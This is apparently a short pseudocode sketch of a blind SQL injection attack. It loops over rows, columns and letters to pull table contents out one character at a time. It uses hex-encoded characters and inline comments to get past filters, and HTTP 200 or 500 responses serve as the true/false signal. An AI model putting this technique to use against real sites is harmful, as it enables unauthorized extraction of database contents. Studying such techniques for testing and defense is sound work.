alphabet = [a,b,c,...,y,z]
characterPosition = 1 # the position of the character we are bruteforcing
for rowNumber in [0,20]:
  for columnName in columns:
    for character in alphabet:
      sqlInjection = '''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''

      inject sqlInjection is POST request body
      if response.status == 200:
        result += character
        recurse function with characterPosition++
      elif response.status == 500:
        continue with next character in alphabet

      return result